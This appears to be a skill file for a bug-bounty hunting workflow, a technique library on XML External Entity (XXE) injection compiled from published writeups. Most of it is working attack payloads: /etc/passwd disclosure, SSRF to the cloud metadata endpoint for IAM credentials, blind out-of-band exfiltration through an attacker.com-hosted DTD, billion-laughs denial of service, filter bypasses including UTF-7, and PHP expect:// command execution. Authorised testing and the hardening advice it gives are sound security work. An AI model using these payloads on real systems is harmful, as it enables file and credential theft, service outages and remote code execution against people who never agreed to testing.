---
name: xxe-injection-testing
description: XML External Entity (XXE) injection testing — any endpoint that parses attacker-supplied XML (SOAP APIs, file uploads accepting XML/SVG/DOCX/XLSX, legacy XML-RPC-adjacent integrations, "import from XML" features) with an XML parser that hasn't disabled external entity resolution. Covers the core `<!DOCTYPE>`/`<!ENTITY>` payload syntax for local file disclosure, SSRF/cloud-metadata-endpoint access via an entity URL, blind/out-of-band XXE via a parameter entity pointing at an attacker-controlled DTD when the response isn't reflected, and the billion-laughs/quadratic-blowup DoS variant. Use this during Phase 3 (Vulnerability Testing — Server-side) of bughunting-workflow on any endpoint that accepts an XML content-type, an XML-based file format (SVG, DOCX/XLSX/PPTX which are zipped XML, RSS/Atom feed import), or a SOAP request body. Also trigger on mentions of XXE, external entity, DOCTYPE injection, SOAP injection, or XML parser misconfiguration.
---

# XXE Injection Testing

Technique library for XML External Entity injection. Each dated entry below is a validated technique pulled from a real writeup — add new entries here (don't create a new skill) whenever a new writeup covers a different delivery vector, blind-exfiltration primitive, or chained impact than what's already recorded.

## Core theory

Most general-purpose XML parsers, by spec-compliant default, will resolve an `<!ENTITY>` declaration that points at an external resource — a local file path, or a URL — and substitute its content into the document wherever that entity is referenced. This is intentional XML functionality (entities are meant to let a document include reusable fragments), not a bug in the parser itself; the vulnerability is entirely in the *application* trusting attacker-supplied XML enough to feed it to a parser that still has this legacy default turned on, instead of explicitly disabling external entity resolution (`disallow-doctype-decl`, `FEATURE_SECURE_PROCESSING`, or the parser library's equivalent hardening flag).

This makes XXE dual-natured: it's a file-disclosure primitive in its own right, *and* a request-forgery primitive — because "resolve this entity's URL and paste its content into the document" is functionally the same capability as SSRF, just delivered through an XML parser instead of an HTTP-fetching business-logic feature. Cross-reference `ssrf-testing` for the full cloud-metadata-endpoint deep-dive (per-provider paths, required headers, IAM-credential chaining) once an XXE-driven SSRF fetch is confirmed — this skill owns the XML-delivery mechanics, that skill owns what to do once you can make an arbitrary internal request.

## Delivery vectors — where to look for an XML parser

- Any endpoint whose `Content-Type` you can set to `application/xml`/`text/xml`, or one that already expects it (SOAP APIs, legacy XML-RPC-adjacent integrations, RSS/Atom import features).
- **File uploads accepting an XML-based format** — SVG (valid XML with embedded scripting/entity potential — also cross-reference `file-upload-testing`), and the Office Open XML formats (`.docx`/`.xlsx`/`.pptx`) which are just ZIP archives of XML documents; uploading a crafted `.docx` where the internal XML carries an XXE payload can work even when the upload endpoint's own request isn't raw XML.
- Any "import from XML/RSS/sitemap" feature, config-import, or third-party webhook payload the backend parses as XML.

## Core payload — local file disclosure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
Send this as the request body wherever an XML payload is expected/accepted, in the field/element position where the application's own data would normally sit. If the parsed value gets reflected back in the response (an echoed confirmation, an error message including the parsed content, a generated document that includes the field), the entity's resolved content — the target file's contents — comes back in the response body directly.

## SSRF / cloud-metadata chaining via XXE

Swap the `SYSTEM` identifier for an internal URL instead of a local file path — the parser will issue the fetch exactly like a URL-fetching SSRF primitive would:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&xxe;</foo>
```
See `ssrf-testing`'s cloud-metadata section for the full per-provider path/header requirements (AWS/Azure/GCP) once you're at this step — the XXE delivery mechanism is identical, the escalation path from here on is pure SSRF.

## Blind XXE via out-of-band exfiltration (when nothing is reflected)

When the parsed entity's content never appears anywhere in the response, use a parameter entity to force the target server to fetch an attacker-hosted external DTD, which in turn builds a second entity that exfiltrates the file content as part of a URL to your own listener:
```xml
<!-- Payload sent to the target: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>&exfil;</foo>
```
```xml
<!-- evil.dtd, hosted on attacker.com: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
```
The target fetches `evil.dtd`, which defines a nested parameter entity that reads the local file and builds a new entity whose *value* is a URL with the file's content appended as a query parameter — the target then resolves that entity too, issuing a request to your listener carrying the stolen data in the URL itself. Confirm the fetch of `evil.dtd` first via a plain OOB canary (an Interactsh/Burp Collaborator URL with no file-read logic) before building the full two-stage exfiltration — same discipline as any other OOB confirmation step elsewhere in this hunting workflow.

## Denial-of-service variant — billion laughs / entity expansion

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!-- continue nesting lol4...lol9 the same way -->
]>
<lolz>&lol9;</lolz>
```
Each nesting level multiplies the expanded size roughly 10x; by lol9 the in-memory expansion reaches billions of characters from a tiny payload, exhausting server memory/CPU. Test cautiously and only within a program's explicit DoS-testing allowance — same responsible-scope discipline as `application-dos-testing`.

## Hardening check for reports

When reporting, name the specific fix so triage/dev can act on it directly rather than "sanitize XML input": disable DTD processing/external entity resolution at the parser level — e.g. `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false` + `SUPPORT_DTD = false` (Java StAX), `libxml_disable_entity_loader(true)` (PHP libxml, pre-8.0 default-on), `resolve_entities=False` (Python lxml), or the equivalent flag on whatever XML library the fingerprinted stack uses — rather than attempting to blacklist `<!DOCTYPE`/`<!ENTITY` strings, which is trivially bypassable through encoding/parameter-entity indirection.

## Recorded techniques

### 1. Core file-disclosure/SSRF-metadata-chaining payload set (baseline)
Source: [Exploiting Information Disclosure Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-information-disclosure-vulnerabilities)

**Where:** any endpoint parsing attacker-controlled XML — the source frames this specifically as an information-disclosure vector (source-code retrieval, config-file/credential exposure, reaching the cloud metadata endpoint) rather than a standalone finding category of its own.

**Root cause:** see Core theory above — a parser with external entity resolution left enabled by default, fed attacker-controlled XML.

**Exploit steps:** find an XML-accepting endpoint via the delivery-vector list above; send the core file-disclosure payload targeting `/etc/passwd` first as a low-risk canary that confirms the parser resolves external entities at all; escalate to source-code/config paths relevant to the fingerprinted stack once confirmed; if the target's infra is cloud-hosted, retarget the entity at `169.254.169.254`'s metadata path and chain into `ssrf-testing`'s credential-theft methodology.

**Impact framing:** source-code/config/credential disclosure reduces the attacker's remaining recon effort dramatically (reading the actual backend logic beats black-box guessing) — frame the report around *what* was retrieved and what it enables (a leaked DB connection string, a cloud IAM credential via the metadata chain), not just "XXE confirmed."

**Generalize note:** this is the same "parser trusts attacker-controlled input enough to resolve external references" root cause behind SSRF (`ssrf-testing`) — XXE is simply SSRF's XML-flavored delivery mechanism, and every downstream escalation path (metadata endpoints, internal-service probing, port-scanning-via-timing) that applies to SSRF applies here too once the entity resolves to a URL instead of a file path.

### 2. Filter-bypass encodings, PHP protocol-wrapper escalation to RCE, and second-order XXE
Source: [Exploiting Advanced XXE Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)

**Where:** any XXE-candidate endpoint where the baseline payload from entry #1 gets blocked/filtered — this entry is the escalation ladder to work through before concluding an XML parser is actually hardened rather than just superficially filtered.

**Parameter-entity ampersand-filter bypass:** if a WAF/input filter specifically blocks the `&entity;` reference syntax (a keyword/character-based filter), use the percent-sign parameter-entity form instead — parameter entities are only referenced *within the DTD itself* (`%name;`), never in the document body, so a filter keyed on document-body entity references misses this form entirely:
```xml
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/"> %xxe;
]>
```

**External-DTD bypass for `file://`-scheme filtering:** if the filter specifically blocks the literal string `file://` in the payload, host the file-read logic on an attacker-controlled external DTD instead — the target's request to *that* URL is an ordinary `http(s)://` fetch (which the filter has no reason to block), and the `file://` reference only ever appears inside the externally-hosted DTD the filter never inspects:
```xml
<!-- Sent to the target -->
<!DOCTYPE foo SYSTEM "https://attacker.com/xxe.dtd">

<!-- xxe.dtd, hosted on attacker.com -->
<!ENTITY % hostname SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM 'http://attacker.com/?c=%hostname;'>">
%e;
%xxe;
```

**UTF-7 encoding bypass:** encode the entire payload in UTF-7 to evade keyword-based filters that scan for literal ASCII strings like `<!DOCTYPE`/`<!ENTITY`/`SYSTEM` — a filter doing plain substring matching on the raw bytes never recognizes the UTF-7-encoded equivalent, but a parser that auto-detects/honors the `encoding="UTF-7"` declaration decodes and processes it identically to the plain-ASCII version:
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-
```
Only works against parsers that actually honor a UTF-7 encoding declaration — confirm the target's XML library supports it before investing time crafting the full encoded payload.

**PHP protocol-wrapper escalation (PHP-backed targets specifically):**
- **`php://filter`** — base64-encodes a file's contents on the way through, useful for exfiltrating PHP *source* files (which would otherwise get executed rather than returned as text if read directly) or binary-ish content that would otherwise break XML's text-content parsing:
  ```xml
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">
  ```
- **`phar://`** — reads a file *inside* a PHAR (PHP Archive) file as if it were a normal path, useful when a phar archive is reachable and contains something worth reading that isn't directly exposed:
  ```xml
  <!ENTITY xxe SYSTEM "phar:///path/to/file.phar/internal/file.php">
  ```
- **`expect://` — direct RCE, when the PHP `expect` module is enabled** (uncommon, but check for it — this is the ceiling escalation from this whole technique family):
  ```xml
  <!ENTITY exec SYSTEM "expect://whoami">
  ```
- **Other wrappers worth trying opportunistically** depending on what's enabled/reachable on the target stack: `zip://`/`jar://` (read a file inside an archive, same idea as `phar://`), `gopher://` (craft raw protocol-level requests to internal services — a distinct SSRF-escalation primitive beyond plain HTTP), `ftp://`, `dict://`, `data://` (inline base64-encoded content, useful for testing parser behavior without needing an external host at all).

**Second-order XXE:** the same "planted now, detonates later" pattern as second-order SQLi/NoSQLi (cross-reference `sqli-waf-bypass-testing`/`nosql-injection-testing`) — a file upload accepting an XML-based format (SVG, DOCX/XLSX) gets stored without immediately being re-parsed, then a *separate*, asynchronous background process (a thumbnail generator, a document-preview renderer, an export/conversion job) opens and parses that stored file later, triggering the XXE payload at a point in time and code path decoupled from the original upload request. Look specifically for any "generate preview"/"convert to PDF"/"reprocess" feature that touches a previously-uploaded file a second time.

**Impact framing:** same ceiling as entry #1 for file-disclosure/SSRF chains, but `expect://` specifically escalates straight to RCE when reachable — always test for the `expect` wrapper's availability once basic XXE is confirmed on a PHP-backed target, since it changes the finding from "information disclosure" to "remote code execution" outright.

**Generalize note:** the throughline across every bypass here is the same as `403-bypass-testing`'s core lesson applied to XML parsing specifically — a filter that blocks a *literal string/character* (`&`, `file://`, `<!DOCTYPE` as ASCII text) doesn't actually understand XML semantics, so any syntactically-equivalent-but-differently-spelled form (parameter entities instead of general entities, an externally-hosted DTD instead of an inline `file://` reference, UTF-7-encoded bytes instead of ASCII) sails through untouched. Always ask "is this filter blocking the *capability* or just one specific *spelling* of it" before concluding a target is hardened.

<!-- Add new recorded techniques below this line as new XXE writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
